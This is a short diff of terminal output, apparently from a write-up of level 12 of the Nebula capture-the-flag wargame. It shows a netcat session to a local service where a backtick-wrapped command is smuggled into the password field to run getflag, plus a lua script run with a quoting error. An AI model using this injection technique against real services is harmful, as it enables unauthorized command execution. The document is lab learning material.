@@ -1,3 +1,9 @@
+level12@nebula:~$ nc localhost 50001
+Password: `getflag` > /tmp/test
+Better luck next time
+level12@nebula:~$ cat /tmp/test
+You have successfully executed getflag on a target account
+
 level12@nebula:~$ lua flag12.lua 
 trying 4754a4f4bd5787accd33de887b9250a0691dd198"#
 sh: -c: line 0: unexpected EOF while looking for matching `"'
